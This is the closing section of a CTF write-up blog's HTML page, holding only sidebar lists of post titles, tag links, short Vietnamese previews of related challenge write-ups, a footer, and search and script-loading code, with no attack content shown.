        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Nodejs-escapeVM/">NodeJS escape VM and some gadgets chaining in NodeJS</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Wannagame2024/">WannaGame</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/KCSCCTF/">KCSC 2024</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/W1Playground/">W1 Playground Writeup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Wannagame-Freshman/">Wannagame Freshman CTF writeup</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/nodejs/">NodeJS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">SSTI</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/base64/">Base64</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/esacpe-vm/">Esacpe VM</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/flask/">Flask</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MYSQL</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">Path Traversal</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/Wannagame2024/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1718380800"
  data-df="ll"
  
>
  Jun 14, 2024
</time>

              <h4 class="pt-0 my-2">WannaGame</h4>
              <div class="text-muted">
                <p>WannaGame vừa mới kết thúc, mình xin viết lại một số bài mà mình làm được, giải này mình khá may mắn khi giải được 2 bài và mình cũng học được rất nhiều thứ từ giải này.



newchall
This is a simpl...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/AsisCTF/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1695571200"
  data-df="ll"
  
>
  Sep 24, 2023
</time>

              <h4 class="pt-0 my-2">Asis CTF 2023 Writeup</h4>
              <div class="text-muted">
                <p>Asis-CTF-2023-Writeup
Bài 1 hello:

  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà mu...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/Wannagame-Freshman/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1699718400"
  data-df="ll"
  
>
  Nov 11, 2023
</time>

              <h4 class="pt-0 my-2">Wannagame Freshman CTF writeup</h4>
              <div class="text-muted">
                <p>WannaWinFreshman-Writeup
Bài 1 Warmup PHP:



  Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Wannagame2024/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>WannaGame</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            
              
              <!-- The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2024</time>

    
      <a href="https://github.com/anzuukino">Yuu</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v6.5.5"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/nodejs/">NodeJS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">SSTI</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/base64/">Base64</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/esacpe-vm/">Esacpe VM</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/flask/">Flask</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MYSQL</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">Path Traversal</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  





    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

